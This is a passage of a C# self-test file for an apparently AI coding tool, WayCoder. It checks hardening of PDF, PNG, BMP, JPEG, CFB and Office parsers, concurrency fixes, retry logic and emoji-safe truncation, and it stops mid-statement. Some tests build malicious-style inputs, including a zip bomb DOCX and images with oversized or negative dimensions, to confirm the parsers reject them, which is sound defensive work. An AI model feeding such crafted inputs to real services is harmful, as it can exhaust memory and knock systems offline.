using System.IO.Compression;
using System.Text;
using System.Text.Json;
using WayCoder.Infra;
using WayCoder.Tools;
using WayCoder.UI.Shared;
using WayCoder.UI.Tui;
using WayCoder.UI.Shared.Terminal;
using WayCoder.UI.Tui.Controls;
using WayCoder.UI.Tui.Screens;

namespace WayCoder;

public static partial class SelfTest
{
    /// <summary>P1 批次：崩溃/健壮性加固（递归深度、死循环、不可信尺寸字段 OOM 防护）测试。</summary>
    private static void TestP1Hardening(Action<string, bool> Check)
    {
        // ── P1-1 PDF 深层嵌套字典/数组防栈溢出（护栏 128 层）──
        var deepPdf = BuildNestedPdf(10000);
        var deepParser = PdfParser.Open(deepPdf);
        Check("Pdf: 万级嵌套数组不栈溢出（返回解析器）", deepParser != null);

        // ── P1-1b PDF 内容流深层嵌套数组防栈溢出（ParseStreamValue↔ParseStreamArray 此前无护栏）──
        var deepContentPdf = BuildNestedContentPdf(5000);
        var deepContentParser = PdfParser.Open(deepContentPdf);
        Check("Pdf: 内容流嵌套数组可解析", deepContentParser != null);
        var deepContentText = deepContentParser?.ExtractPageText(1);
        Check("Pdf: 内容流嵌套数组提取不栈溢出", deepContentText != null);

        // ── P1-2 PNG 负数 chunk 长度防死循环 ──
        var pngNeg = new byte[16];
        new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A }.CopyTo(pngNeg, 0);
        pngNeg[8] = 0x80; // len = 0x80000000（BE32 读作负数）
        bool pngNegThrew = false;
        try { PngDecoder.Decode(pngNeg); } catch (FormatException) { pngNegThrew = true; }
        Check("Png: 负数 chunk 长度报错（不死循环）", pngNegThrew);

        // ── P1-2 DrawCanvas 圆/椭圆 NaN/Inf/超大半径防死循环 ──
        bool fillOk = true;
        try
        {
            var c1 = new Canvas(100, 100, 0xFFFFFFFF);
            c1.FillCircle(50, 50, double.NaN, 0xFF000000);
            c1.FillCircle(50, 50, 1e300, 0xFF000000);
            var c2 = new Canvas(100, 100, 0xFFFFFFFF);
            c2.FillEllipse(50, 50, double.PositiveInfinity, 5, 0xFF000000);
            c2.FillEllipse(50, 50, 5, double.NegativeInfinity, 0xFF000000);
            c2.FillEllipse(50, 50, 0, 5, 0xFF000000);
        }
        catch { fillOk = false; }
        Check("Draw: 圆/椭圆 NaN/Inf/超大半径不崩", fillOk);

        // ── P1-3 PNG 超大尺寸防 OOM ──
        var pngBig = new byte[33];
        new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A }.CopyTo(pngBig, 0);
        pngBig[11] = 13; // IHDR 长度
        Encoding.ASCII.GetBytes("IHDR").CopyTo(pngBig, 12);
        pngBig[18] = 0xFF; pngBig[19] = 0xFF; // width = 65535
        pngBig[22] = 0xFF; pngBig[23] = 0xFF; // height = 65535
        pngBig[24] = 8; pngBig[25] = 6; // bitDepth=8, colorType=RGBA
        bool pngBigThrew = false;
        try { PngDecoder.Decode(pngBig); } catch (FormatException) { pngBigThrew = true; }
        Check("Png: 超大尺寸报错（防 OOM）", pngBigThrew);

        // ── P1-3 BMP 超大尺寸防 OOM ──
        var bmpBig = new byte[54];
        bmpBig[0] = (byte)'B'; bmpBig[1] = (byte)'M';
        W32(bmpBig, 10, 54);      // dataOffset
        W32(bmpBig, 14, 40);      // dibSize
        W32(bmpBig, 18, 65535);   // width
        W32(bmpBig, 22, 65535);   // height
        W16(bmpBig, 28, 24);      // bpp
        W32(bmpBig, 30, 0);       // BI_RGB
        bool bmpBigThrew = false;
        try { BmpCodec.Decode(bmpBig); } catch (FormatException) { bmpBigThrew = true; }
        Check("Bmp: 超大尺寸报错（防 OOM）", bmpBigThrew);

        // ── P1-3 JPEG 超大尺寸 / 非法分量数 / 非法采样因子 ──
        var jpegBig = new byte[]
        {
            0xFF, 0xD8,                       // SOI
            0xFF, 0xC0, 0x00, 0x0B, 8,       // SOF0: len=11, precision=8
            0xFF, 0xFF, 0xFF, 0xFF,          // height=65535, width=65535
            1, 1, 0x11, 0,                   // nComp=1, comp[0] id=1 hv=0x11 qid=0
            0xFF, 0xDA, 0x00, 0x08, 1,       // SOS: len=8, n=1
            1, 0x00, 0, 0x3F, 0,             // comp id=1 hf=0, Ss=0 Se=63 AhAl=0
            0x00, 0x00, 0xFF, 0xD9,          // 熵数据 + EOI
        };
        bool jpegBigThrew = false;
        try { JpegCodec.Decode(jpegBig); } catch (FormatException) { jpegBigThrew = true; }
        Check("Jpeg: 超大尺寸报错（防 OOM）", jpegBigThrew);

        // 非法分量数 nComp=5
        var jpegNComp = new List<byte> { 0xFF, 0xD8, 0xFF, 0xC0, 0x00, 0x17, 8, 0, 16, 0, 16, 5 };
        for (int i = 0; i < 5; i++) { jpegNComp.Add(1); jpegNComp.Add(0x11); jpegNComp.Add(0); }
        bool jpegNCompThrew = false;
        try { JpegCodec.Decode(jpegNComp.ToArray()); } catch (FormatException) { jpegNCompThrew = true; }
        Check("Jpeg: 非法分量数报错", jpegNCompThrew);

        // 非法采样因子 hv=0x05（hh=0）
        var jpegHv = new List<byte> { 0xFF, 0xD8, 0xFF, 0xC0, 0x00, 0x0B, 8, 0, 16, 0, 16, 1, 1, 0x05, 0 };
        bool jpegHvThrew = false;
        try { JpegCodec.Decode(jpegHv.ToArray()); } catch (FormatException) { jpegHvThrew = true; }
        Check("Jpeg: 非法采样因子报错", jpegHvThrew);

        // ── P1-3 DrawEngine 超大画布防 OOM ──
        var bigCanvas = DrawRunner.Parse("canvas 100000 100000\nrect 0 0 10 10");
        Check("Draw: 超大画布报错", bigCanvas.Error != null);
        Check("Draw: 超大画布保留默认尺寸", bigCanvas.Width == 800 && bigCanvas.Height == 600);

        // ── P1-3 CFB 超大 Size 字段钳制到文件大小 ──
        var cfbHuge = BuildCfb(("S", Encoding.ASCII.GetBytes("hi")));
        W64(cfbHuge, 1024 + 128 + 120, 0xFFFFFFFFUL); // 目录扇区 1 → offset 1024，流条目 di=1 → +128，size 字段 +120
        var hugeDoc = CfbParser.Open(cfbHuge);
        Check("Wps: 超大 Size 字段仍可解析", hugeDoc != null);
        var hugeStream = hugeDoc?.GetStream("S");
        Check("Wps: 超大 Size 流长度被钳制", hugeStream != null && hugeStream.Length <= cfbHuge.Length);

        // ── P1-3 Office zip bomb 防 OOM ──
        var bombPath = Path.Combine(Path.GetTempPath(), "wc_bomb_" + Guid.NewGuid().ToString("N")[..6] + ".docx");
        try
        {
            using (var fs = File.Create(bombPath))
            using (var zip = new ZipArchive(fs, ZipArchiveMode.Create))
            {
                var entry = zip.CreateEntry("word/document.xml");
                using var es = entry.Open();
                var chunk = new byte[1024 * 1024];
                Array.Fill(chunk, (byte)'A');
                for (int i = 0; i < 65; i++) es.Write(chunk, 0, chunk.Length); // 65MB 高度可压缩
            }
            var bombResult = OfficeExtractor.ExtractDocx(bombPath);
            Check("Office: zip bomb 报错不 OOM", bombResult.Contains("错误") || bombResult.Contains("zip bomb"));
        }
        finally { try { File.Delete(bombPath); } catch { } }
    }

    /// <summary>P3 并发竞态修复验证：ModelOverride 恢复 / 线程安全集合 / 后台任务输出 / LRU 回调重入 / 文件锁并发 / LLM 重试。</summary>
    private static void TestP3Concurrency(Action<string, bool> Check)
    {
        // ── 1. WithModelOverrideAsync：异常不污染 ModelOverride ──
        var mLLM = new LLM("big-model", "k");
        mLLM.SmallModel = "small-model";
        mLLM.ModelOverride = null;
        var mr = Agent.WithModelOverrideAsync(mLLM, "small-model", async () =>
        {
            await Task.CompletedTask;
            return "done";
        }).GetAwaiter().GetResult();
        Check("P3: WithModelOverride 成功返回", mr == "done");
        Check("P3: WithModelOverride 成功后恢复", mLLM.ModelOverride == null);

        mLLM.ModelOverride = "orig";
        try
        {
            Agent.WithModelOverrideAsync(mLLM, "small-model", async () =>
            {
                await Task.CompletedTask;
                throw new InvalidOperationException("boom");
            }).GetAwaiter().GetResult();
        }
        catch (InvalidOperationException) { }
        Check("P3: WithModelOverride 异常后恢复", mLLM.ModelOverride == "orig");

        // ── 2. ThreadSafeStringSet：并发 Add 去重 + 快照枚举 ──
        var tss = new ThreadSafeStringSet();
        System.Threading.Tasks.Parallel.For(0, 1000, i => tss.Add("file" + (i % 50)));
        Check("P3: ThreadSafeStringSet 并发去重计数", tss.Count == 50);
        var snap = tss.ToList();
        Check("P3: ThreadSafeStringSet 快照", snap.Count == 50);
        Check("P3: ThreadSafeStringSet 包含", tss.Contains("file0") && tss.Contains("file49"));

        // ── 3. BackgroundTask：并发追加输出不丢更新 ──
        var bt = new BackgroundTaskManager.BgTask(1, "echo", DateTime.Now);
        var segs = Enumerable.Range(0, 200).Select(i => $"#{i}#").ToArray();
        System.Threading.Tasks.Parallel.For(0, 200, i => bt.AppendOutput(segs[i]));
        Check("P3: BackgroundTask 并发追加无丢失", segs.All(s => bt.Output.Contains(s)));

        // ── 4. LruCache：OnEvicted 回调内重入不死锁（回调须在锁外触发）──
        bool reentrantOk = true;
        try
        {
            var rc = new LruCache<string, int>(2);
            rc.OnEvicted += (k, _) => { if (k == "a") rc.Put("z", 99); };
            rc.Put("a", 1);
            rc.Put("b", 2);
            rc.Put("c", 3); // 淘汰 a → 回调内 Put("z", 99) 重入
            reentrantOk = rc.Get("z") == 99;
        }
        catch { reentrantOk = false; }
        Check("P3: LruCache OnEvicted 回调重入不死锁", reentrantOk);

        // ── 5. FileLockManager：并发抢锁互斥 + 同 agent 续期 ──
        var racePath = Path.Combine(Path.GetTempPath(), "wc_race_" + Guid.NewGuid().ToString("N")[..6] + ".txt");
        int winners = 0;
        System.Threading.Tasks.Parallel.For(0, 32, i =>
        {
            if (FileLockManager.TryAcquire(racePath, $"race-{i}", TimeSpan.FromSeconds(30)))
                System.Threading.Interlocked.Increment(ref winners);
        });
        Check("P3: FileLock 并发抢锁仅 1 成功", winners == 1);

        // 释放抢锁赢家，避免残留锁污染后续测试的锁列表断言
        var holder = FileLockManager.GetLockInfo(racePath)?.AgentId;
        if (holder != null) FileLockManager.Release(racePath, holder);
        Check("P3: FileLock 抢锁赢家已释放", FileLockManager.GetLockInfo(racePath) == null);

        // 同 agent 并发续期：全部成功（续期幂等，不丢锁）
        Check("P3: FileLock renewer 首获成功", FileLockManager.TryAcquire(racePath, "renewer", TimeSpan.FromSeconds(30)));
        int renewOk = 0;
        System.Threading.Tasks.Parallel.For(0, 32, i =>
        {
            if (FileLockManager.TryAcquire(racePath, "renewer", TimeSpan.FromSeconds(30)))
                System.Threading.Interlocked.Increment(ref renewOk);
        });
        Check("P3: FileLock 同 agent 并发续期全部成功", renewOk == 32);
        FileLockManager.Release(racePath, "renewer");

        // ── 6. LLM 5xx 重试（响应释放 + 重试成功）──
        // 退避基准调小到 1ms：重试机制照常验证（≥3 次请求），但不再干等 2^attempt×1000ms ≈ 3s
        var savedRetryBackoff = LLM.RetryBackoffMs;
        LLM.RetryBackoffMs = 1;
        var retryServer = new WayCoder.UI.Web.HttpServer(0);
        int attempts = 0;
        retryServer.OnRequest = async _ =>
        {
            int n = System.Threading.Interlocked.Increment(ref attempts);
            if (n < 3)
                return new WayCoder.UI.Web.HttpResponse { Status = 500, Reason = "Internal Server Error", Body = Encoding.UTF8.GetBytes("server error") };
            var sse = "data: {\"choices\":[{\"delta\":{\"content\":\"hello\"}}]}\n\n" +
                      "data: {\"choices\":[{\"delta\":{\"content\":\"world\"}}]}\n\n" +
                      "data: [DONE]\n\n";
            return WayCoder.UI.Web.HttpResponse.JsonBody(sse);
        };
        retryServer.Start();
        try
        {
            var retryLlm = new LLM("test-model", "test-key", $"http://127.0.0.1:{retryServer.ActualPort}");
            var r = retryLlm.ChatAsync(new List<JNode> { JNode.Object().Set("role", "user").Set("content", "hi") }).GetAwaiter().GetResult();
            Check("P3: LLM 5xx 重试后成功", r.Content.Contains("hello"));
            Check("P3: LLM 重试发起 ≥3 次请求", attempts >= 3);
        }
        catch (Exception ex)
        {
            DebugLog.Log("selftest", "LLM retry test: " + ex);
            Check("P3: LLM 5xx 重试后成功", false);
        }
        finally
        {
            retryServer.Stop();
            LLM.RetryBackoffMs = savedRetryBackoff;
        }
    }

    /// <summary>v0.71.8 批次：UTF-16 代理对截断 + BMP int.MinValue 溢出 + LogMetrics 缩容。</summary>
    private static void TestV0718RuneHardening(Action<string, bool> Check)
    {
        // ── AnsiString.TruncateByWidth：代理对按码点截断，不产出替换符 ──
        var w = AnsiString.TruncateByWidth("😀😀", 2);
        Check("AnsiString: 代理对不切半", !w.Contains('�') && AnsiString.DisplayWidth(w) <= 2);
        Check("AnsiString: 截断后宽度=2", AnsiString.DisplayWidth(w) == 2);
        var w2 = AnsiString.TruncateByWidth("ab😀cd", 3);
        Check("AnsiString: emoji 前截断不越界", !w2.Contains('�') && AnsiString.DisplayWidth(w2) <= 3);

        // ── BMP height == int.MinValue：|height| 溢出 int，必须抛 FormatException ──
        var bmpMin = new byte[54];
        bmpMin[0] = (byte)'B'; bmpMin[1] = (byte)'M';
        W32(bmpMin, 10, 54);                 // dataOffset
        W32(bmpMin, 14, 40);                 // dibSize
        W32(bmpMin, 18, 100);                // width
        W32(bmpMin, 22, (long)int.MinValue); // height = int.MinValue（负数极值）
        W16(bmpMin, 28, 24);                 // bpp
        W32(bmpMin, 30, 0);                  // BI_RGB
        bool bmpMinFmt = false, bmpMinOverflow = false;
        try { BmpCodec.Decode(bmpMin); }
        catch (FormatException) { bmpMinFmt = true; }
        catch (OverflowException) { bmpMinOverflow = true; }
        Check("Bmp: height=int.MinValue 抛 FormatException 而非溢出", bmpMinFmt && !bmpMinOverflow);

        // ── LogMetrics 缩容后重置写指针：缩容后继续 Record 不再越界 ──
        LogMetrics.Reset();
        LogMetrics.RingCapacity = 3;
        for (int i = 0; i < 5; i++)
            LogMetrics.Record(new LogEntry(LogLevel.Info, $"msg{i}"));
        var r3 = LogMetrics.Recent(10);
        Check("LogMetrics: 满容量保留最近 3 条", r3.Count == 3);
        Check("LogMetrics: 环形顺序（最旧在前）", r3[0].Message == "msg2" && r3[1].Message == "msg3" && r3[2].Message == "msg4");

        LogMetrics.RingCapacity = 2; // 缩容触发 _ringIndex 重置（修复前会残留越界写指针）
        for (int i = 5; i < 8; i++)
            LogMetrics.Record(new LogEntry(LogLevel.Info, $"msg{i}"));
        var r2 = LogMetrics.Recent(10);
        Check("LogMetrics: 缩容后继续覆盖不越界", r2.Count == 2 && r2[0].Message == "msg6" && r2[1].Message == "msg7");
        LogMetrics.RingCapacity = 256; // 还原默认容量
        LogMetrics.Reset();
    }

    /// <summary>v0.71.9 批次：ANSI CSI 终止符 + BoxBuffer 负宽度 + 双省略号/宽度预留 修复的纯逻辑测试。</summary>
    private static void TestV0719RuneHardening(Action<string, bool> Check)
    {
        // ── AnsiString.Strip：CSI 终止符改为 0x40-0x7E 区间，不再吞掉后续文本 ──
        Check("AnsiString.Strip: DECTCEM 隐藏光标不吞字符", AnsiString.Strip("\x1b[?25lHELLO") == "HELLO");
        Check("AnsiString.Strip: DECTCEM 显示光标不吞字符", AnsiString.Strip("\x1b[?25hWORLD") == "WORLD");
        Check("AnsiString.Strip: 光标移动 A/B/C/D 不吞字符", AnsiString.Strip("\x1b[2AUP\x1b[1B") == "UP");
        Check("AnsiString.Strip: 保存/恢复光标 s/u 不吞字符", AnsiString.Strip("\x1b[sSAVE\x1b[u") == "SAVE");
        Check("AnsiString.Strip: 常规 SGR 仍正确", AnsiString.Strip("\x1b[1;31mRED\x1b[0m") == "RED");

        // ── BoxBuffer.Render：Width < 2 时 new string(char, 负值) 不再抛异常 ──
        bool tinyOk = true;
        foreach (int w in new[] { 0, 1, 2 })
        {
            try
            {
                var bb = new BoxBuffer { X = 0, Y = 0, Width = w, Height = 3, Border = BorderStyle.Single };
                var sb = new StringBuilder();
                bb.Render(sb);
            }
            catch { tinyOk = false; }
        }
        Check("BoxBuffer: Width<2 渲染不崩溃", tinyOk);

        // ── BoxBuffer.TruncateByVW 纯截断（不加省略号）仍按视觉宽度正确 ──
        Check("BoxBuffer.TruncateByVW: CJK 边界不越界",
            BoxBuffer.TruncateByVW("你好世界", 4) == "你好" && BoxBuffer.TruncateByVW("你好世界", 3) == "你");
        Check("BoxBuffer.TruncateByVW: emoji 代理对不切半", !BoxBuffer.TruncateByVW("a😀b", 3).Contains('�'));
    }

    /// <summary>v0.71.10 批次：输入控件（TuiInput/TuiTextArea）光标移动与删除对代理对（emoji/CJK 扩展 B）安全，不切半成 U+FFFD。</summary>
    private static void TestV0710EditPrimitives(Action<string, bool> Check)
    {
        var left = new ConsoleKeyInfo('\0', ConsoleKey.LeftArrow, false, false, false);
        var right = new ConsoleKeyInfo('\0', ConsoleKey.RightArrow, false, false, false);
        var backspace = new ConsoleKeyInfo('\b', ConsoleKey.Backspace, false, false, false);
        var delete = new ConsoleKeyInfo('\0', ConsoleKey.Delete, false, false, false);

        // ── TuiInput 单行：光标移动跳过代理对中间 ──
        // "a😀b"：'a'=0, 高代理=1, 低代理=2, 'b'=3，Text.Length=4
        var inp = new TuiInput { Text = "a😀b", Focused = true, CursorPos = 3 };
        inp.OnKey(left);
        Check("TuiInput: 左移跳过代理对中间(3→1)", inp.CursorPos == 1);
        inp.OnKey(right);
        Check("TuiInput: 右移跳过代理对中间(1→3)", inp.CursorPos == 3);

        inp = new TuiInput { Text = "a😀b", Focused = true, CursorPos = 3 };
        inp.OnKey(backspace);
        Check("TuiInput: 退格整删 emoji 不切半", inp.Text == "ab" && inp.CursorPos == 1 && !inp.Text.Contains('�'));

        inp = new TuiInput { Text = "a😀b", Focused = true, CursorPos = 1 };
        inp.OnKey(delete);
        Check("TuiInput: Delete 整删 emoji 不切半", inp.Text == "ab" && !inp.Text.Contains('�'));

        // ── TuiTextArea 多行：光标移动跳过代理对中间 ──
        var ta = new TuiTextArea { Text = "a😀b", Focused = true };
        ta.CursorCol = 3;
        ta.OnKey(left);
        Check("TuiTextArea: 左移跳过代理对中间(3→1)", ta.CursorCol == 1);
        ta.OnKey(right);
        Check("TuiTextArea: 右移跳过代理对中间(1→3)", ta.CursorCol == 3);

        ta = new TuiTextArea { Text = "a😀b", Focused = true };
        ta.CursorCol = 3;
        ta.OnKey(backspace);
        Check("TuiTextArea: 退格整删 emoji 不切半", ta.Text == "ab" && ta.CursorCol == 1 && !ta.Text.Contains('�'));

        ta = new TuiTextArea { Text = "a😀b", Focused = true };
        ta.CursorCol = 1;
        ta.OnKey(delete);
        Check("TuiTextArea: Delete 整删 emoji 不切半", ta.Text == "ab" && !ta.Text.Contains('�'));
    }

    /// <summary>v0.71.11 批次：并发安全修复（FallbackLLM 原子累加 + WatchMode 幂等 dispose）。</summary>
    private static void TestV0711Concurrency(Action<string, bool> Check)
    {
        // ── FallbackLLM.TotalSpent 原子累加：并发 AddSpent 无丢失 increment ──
        // double 的 += 是读-改-写，非原子；锁保护后 10000 次并发累加必须精确无丢失。
        FallbackLLM.Reset();
        System.Threading.Tasks.Parallel.For(0, 10000, i => FallbackLLM.AddSpent(0.5));
        Check("FallbackLLM: 并发累加 10000×0.5 无丢失", Math.Abs(FallbackLLM.TotalSpent - 5000.0) < 0.001);
        FallbackLLM.Reset();
        Check("FallbackLLM: Reset 后归零", Math.Abs(FallbackLLM.TotalSpent) < 0.001 && FallbackLLM.FallbackIndex == -1);

        // ── WatchMode：重复 Stop/Dispose 幂等（定时器清理在锁内，不抛异常） ──
        bool watchOk = true;
        try
        {
            var wm = new WatchMode(System.IO.Path.GetTempPath(), _ => { });
            wm.Stop();
            wm.Stop();       // 重复 Stop 幂等
            wm.Dispose();
            wm.Dispose();    // 重复 Dispose 幂等
        }
        catch { watchOk = false; }
        Check("WatchMode: 重复 Stop/Dispose 幂等不抛异常", watchOk);
    }

    /// <summary>v0.71.12 批次：Agent.Messages 线程安全封装（锁内读/写 + 快照读）。</summary>
    private static void TestV0712MessagesThreadSafety(Action<string, bool> Check)
    {
        // ── 封装方法功能正确性 ──
        var a = new Agent(new LLM("test", "sk-test"));
        a.AddMessage(JNode.Object().Set("role", "user").Set("content", "a"));
        a.AddMessage(JNode.Object().Set("role", "assistant").Set("content", "b"));
        a.AddMessage(JNode.Object().Set("role", "user").Set("content", "c"));
        Check("AddMessage 追加 3 条", a.SnapshotMessages().Count == 3);

        // SnapshotMessages 返回副本：改副本不影响原列表
        var snap = a.SnapshotMessages();
        snap.Clear();
        Check("SnapshotMessages 返回副本（改副本不影响原列表）", a.SnapshotMessages().Count == 3);

        // InsertMessage / RemoveMessageAt
        a.InsertMessage(1, JNode.Object().Set("role", "system").Set("content", "sys"));
        Check("InsertMessage 插入索引 1", a.SnapshotMessages().Count == 4
            && a.SnapshotMessages()[1]["role"]?.AsString() == "system");
        a.RemoveMessageAt(1);
        Check("RemoveMessageAt 删除索引 1", a.SnapshotMessages().Count == 3);

        // ReplaceMessages / ClearMessages
        a.ReplaceMessages(new[] { JNode.Object().Set("role", "user").Set("content", "only") });
        Check("ReplaceMessages 整体替换", a.SnapshotMessages().Count == 1
            && a.SnapshotMessages()[0]["content"]?.AsString() == "only");
        a.ClearMessages();
        Check("ClearMessages 清空", a.SnapshotMessages().Count == 0);

        // ── 并发压力：写线程 AddMessage 与读线程 SnapshotMessages 并发不抛异常 ──
        // 修复前：外部遍历 List<JNode> 与主循环 Add 并发会抛 InvalidOperationException
        var agent = new Agent(new LLM("test", "sk-test"));
        bool raced = false;
        try
        {
            var writer = Task.Run(() =>
            {
                for (int i = 0; i < 5000; i++)
                    agent.AddMessage(JNode.Object().Set("role", "user").Set("content", "m" + i));
            });
            var reader = Task.Run(() =>
            {
                for (int i = 0; i < 5000; i++)
                    _ = agent.SnapshotMessages().Count; // 只读遍历
            });
            Task.WaitAll(writer, reader);
        }
        catch { raced = true; }
        Check("并发 AddMessage + SnapshotMessages 不抛异常", !raced && agent.SnapshotMessages().Count == 5000);
    }

    /// <summary>v0.71.13 批次：AgentSlot.Cts 原子摘除（Interlocked.Exchange 恰好一个取到非 null）。</summary>
    private static void TestV0713CtsLifecycle(Action<string, bool> Check)
    {
        // ── 字段独立语义 ──
        var slot = new AgentSlot();
        Check("Cts 初始为 null", slot.Cts == null);
        Check("IsBusy 初始 false", !slot.IsBusy);

        var cts = new CancellationTokenSource();
        slot.Cts = cts;
        slot.IsBusy = true;
        Check("Cts/IsBusy 可独立置位", ReferenceEquals(slot.Cts, cts) && slot.IsBusy);

        // ── Interlocked.Exchange 原子摘除：并发摘除恰好一个取到非 null，且字段归 null ──
        // Esc 中断路径与后台 finally 路径并发摘除，靠原子 Exchange 保证「只有一个负责 Dispose」。
        var slot2 = new AgentSlot();
        var cts2 = new CancellationTokenSource();
        slot2.Cts = cts2;
        CancellationTokenSource? got1 = null, got2 = null;
        var t1 = Task.Run(() => got1 = Interlocked.Exchange(ref slot2.Cts, null));
        var t2 = Task.Run(() => got2 = Interlocked.Exchange(ref slot2.Cts, null));
        Task.WaitAll(t1, t2);
        Check("并发摘除恰好一个取到非 null", (got1 == null) != (got2 == null));
        Check("摘除后字段归 null", slot2.Cts == null);
        Check("取到者是原 Cts 实例", ReferenceEquals(got1 ?? got2, cts2));
    }

    /// <summary>v0.71.14 批次：Retry-After 头解析负数/非法值回退（防止 Task.Delay 抛异常）。</summary>
    private static void TestV0714RetryAfter(Action<string, bool> Check)
    {
        // ── 纯数字（秒）──
        var pos = new System.Net.Http.HttpResponseMessage();
        pos.Headers.TryAddWithoutValidation("Retry-After", "5");
        Check("Retry-After 正整数 → 正延迟", LLM.ParseRetryAfter(pos) is int p && p > 0);

        var zero = new System.Net.Http.HttpResponseMessage();
        zero.Headers.TryAddWithoutValidation("Retry-After", "0");
        Check("Retry-After 0 → 立即重试(0)", LLM.ParseRetryAfter(zero) == 0);

        var neg = new System.Net.Http.HttpResponseMessage();
        neg.Headers.TryAddWithoutValidation("Retry-After", "-5");
        Check("Retry-After 负数 → 回退默认退避(null)", LLM.ParseRetryAfter(neg) == null);

        var negOne = new System.Net.Http.HttpResponseMessage();
        negOne.Headers.TryAddWithoutValidation("Retry-After", "-1");
        Check("Retry-After -1 → 回退(null) 而非无限等待", LLM.ParseRetryAfter(negOne) == null);

        // ── 缺失 / 非法 ──
        var none = new System.Net.Http.HttpResponseMessage();
        Check("无 Retry-After 头 → null", LLM.ParseRetryAfter(none) == null);

        var garbage = new System.Net.Http.HttpResponseMessage();
        garbage.Headers.TryAddWithoutValidation("Retry-After", "not-a-number");
        Check("Retry-After 非数字 → null", LLM.ParseRetryAfter(garbage) == null);

        // ── HTTP-date ──
        var past = new System.Net.Http.HttpResponseMessage();
        past.Headers.TryAddWithoutValidation("Retry-After", DateTime.UtcNow.AddHours(-1).ToString("o"));
        Check("Retry-After 过去时间 → null", LLM.ParseRetryAfter(past) == null);

        var future = new System.Net.Http.HttpResponseMessage();
        future.Headers.TryAddWithoutValidation("Retry-After", DateTime.UtcNow.AddSeconds(30).ToString("o"));
        Check("Retry-After 未来时间 → 正延迟", LLM.ParseRetryAfter(future) is int f && f > 0);
    }

    /// <summary>v0.71.15 批次：Web/TUI 上下文压缩界面指示（SerializeCompress 纯函数 + CompressFinished 事件）。</summary>
    private static void TestV0715CompressIndicator(Action<string, bool> Check)
    {
        // ── SerializeCompress 纯函数（Web 压缩进度/结束 SSE 事件载荷）──
        var doneNode = Json.Parse(WayCoder.UI.Web.WebChatServer.SerializeCompress(0, "", 0, true));
        Check("compress 结束事件 done=true", doneNode?["done"]?.AsBool() == true);

        var progNode = Json.Parse(WayCoder.UI.Web.WebChatServer.SerializeCompress(2, "正在摘要旧对话...", 45.5, false));
        Check("compress 进度 layer=2", progNode?["layer"]?.AsNumber() == 2);
        Check("compress 进度 label 透传", progNode?["label"]?.AsString() == "正在摘要旧对话...");
        Check("compress 进度 percent 透传", progNode?["percent"]?.AsNumber() == 45.5);
        Check("compress 进度 done=false", progNode?["done"]?.AsBool() == false);

        // ── CompressFinished 事件 + IsCompressing 复位（极小上下文不触发压缩也不发 LLM 调用）──
        var cm = new ContextManager();
        var llm = new LLM("test", "sk-test");
        var msgs = new List<JNode>();
        bool finished = false;
        void OnFinished() => finished = true;
        ContextManager.CompressFinished += OnFinished;
        try
        {
            var compressed = cm.MaybeCompressAsync(msgs, llm).GetAwaiter().GetResult();
            Check("压缩检查结束触发 CompressFinished", finished);
            Check("压缩检查后 IsCompressing 复位 false", !ContextManager.IsCompressing);
            Check("极小上下文无需压缩 → compressed=false", !compressed);
        }
        finally
        {
            ContextManager.CompressFinished -= OnFinished;
        }
    }

    /// <summary>v0.71.16 批次：6 处 UTF-16 原始切片改走 TruncateByRunes，杜绝代理对在数据路径被切半成 U+FFFD。</summary>
    private static void TestV0716RuneSafeTruncation(Action<string, bool> Check)
    {
        // ── OfficeExtractor（DOCX 提取）maxChars 落在 emoji 代理对中间时不切半 ──
        // 构造最小 DOCX：word/document.xml 一段落 "aa😀bb"（😀=U+1F600，占 2 个 UTF-16 code unit）
        const string docXml = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>" +
            "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">" +
            "<w:body><w:p><w:r><w:t>aa😀bb</w:t></w:r></w:p></w:body></w:document>";

        var tmp = Path.Combine(Path.GetTempPath(), "wc_docx_" + Guid.NewGuid().ToString("N") + ".docx");
        try
        {
            using (var fs = File.Create(tmp))
            using (var zip = new ZipArchive(fs, ZipArchiveMode.Create))
            {
                var entry = zip.CreateEntry("word/document.xml");
                using (var sw = new StreamWriter(entry.Open(), new UTF8Encoding(false)))
                    sw.Write(docXml);
            }

            // maxChars=3 恰好落在 😀 代理对中间（"aa😀bb" 第 3 个 code unit 是高位代理）
            var result = OfficeExtractor.ExtractDocx(tmp, maxChars: 3);

            // 无孤立代理项（旧代码 result[..3] 会产出半 emoji → U+FFFD）
            Check("Office 提取: maxChars 落代理对不切半", !HasLoneSurrogate(result));
            // 完整 emoji 被保留在截断点之前
            Check("Office 提取: emoji 完整保留", result.StartsWith("aa😀"));
            // 截断说明正常追加
            Check("Office 提取: 截断说明保留", result.Contains("截断于 3"));

            // ── DoctorEngine 的日志预览截断（v0.96.104）──
            // 「最近日志含 N 条 ERROR」的示例预览此前写 `preview[..160] + "…"` —— 日志行含中文与 emoji，
            // UTF-16 切片落在代理对中间就产出孤立代理项（用户看到 U+FFFD）。改走 TruncateWithEllipsis。
            // 159 个 BMP 字 + 1 个 emoji（占 2 个 code unit）⇒ [..160] 恰好只取到 emoji 的高位代理。
            var logLine = new string('日', 159) + "😀" + "尾部";
            Check("日志预览截断: 旧写法 [..160] 确实切出孤立代理（这就是要修的东西）",
                HasLoneSurrogate(logLine[..160]));
            Check("日志预览截断: TruncateWithEllipsis 不切出孤立代理",
                !HasLoneSurrogate(ContextManager.TruncateWithEllipsis(logLine, 160)));
            Check("日志预览截断: 短行原样返回（不白加省略号）",
                ContextManager.TruncateWithEllipsis("普通日志行", 160) == "普通日志行");

            // 端到端：真造一份带 emoji 的 error 日志跑 CheckErrorLogs，
            // 断言最终**提示文案**里没有孤立代理（这才能证伪调用点本身，而不是只测到 helper）。
            // 偏移设计：preview 下标 159 是 emoji 的高位代理 ⇒ 旧的 [..160] 必然切半。
            var docDir = Path.Combine(Path.GetTempPath(), "wc_doctor_" + Guid.NewGuid().ToString("N")[..8]);
            try
            {
                Directory.CreateDirectory(Path.Combine(docDir, "logs"));
                File.WriteAllText(Path.Combine(docDir, "logs", "error_20260101.log"),
                    "ERROR " + new string('日', 153) + "😀" + "尾部\n", new UTF8Encoding(false));
                var docIssues = new List<DoctorIssue>();
                DoctorEngine.CheckErrorLogs(docDir, docIssues);
                var msg = docIssues.Count > 0 ? docIssues[0].Message : "";
                Check("日志预览截断: Doctor 提示文案无孤立代理（端到端）",
